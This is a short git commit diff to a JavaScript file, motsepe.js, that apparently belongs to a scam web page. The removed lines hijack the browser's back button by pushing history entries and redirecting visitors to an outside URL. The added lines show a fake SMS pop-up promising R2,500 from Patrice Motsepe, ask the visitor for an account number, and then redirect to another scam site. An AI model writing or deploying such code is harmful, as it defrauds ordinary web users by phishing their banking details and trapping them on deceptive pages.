d18507e135c176f1af462a56baecb3e7097ab07a
usorondo100 <sputter_muezzin_4k@icloud.com>
2026-05-20 09:01:07 +0100

    Update motsepe.js

--- motsepe.js
+++ motsepe.js
@@ -1,11 +1,5 @@
- window.onhashchange=function(){jp();};
-    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {
-        fh();}
-    setTimeout('hh();', 500);
-    function fh(){
-        location.href="https://crn77.com/4/8525379";
-    }
-    function goon(){
-        location.href="https://crn77.com/4/8525379";
-    }
+var password = 'WITHDRAW R2,500'
+password=prompt('SMS: Congratulations, you are eligible to receive R2,500 From Patrice Motsepe, click OK to Enter Your Acc. Number','WITHDRAW R2,500');
+if (password != 'WITHDRAW R2,500') {
+location.href='https://www.makemeiitid.site/motsepe-r2500-gift';
+}
